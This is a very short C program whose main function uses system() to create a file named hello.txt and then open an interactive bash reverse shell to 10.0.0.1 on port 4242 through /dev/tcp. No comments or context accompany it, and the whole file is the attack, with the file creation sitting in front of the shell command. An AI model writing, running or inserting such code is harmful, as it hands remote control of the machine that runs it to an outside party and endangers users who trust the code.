#include <stdlib.h>

int main() {
    system("touch hello.txt && bash -i >& /dev/tcp/10.0.0.1/4242 0>&1");
    return 0;
}
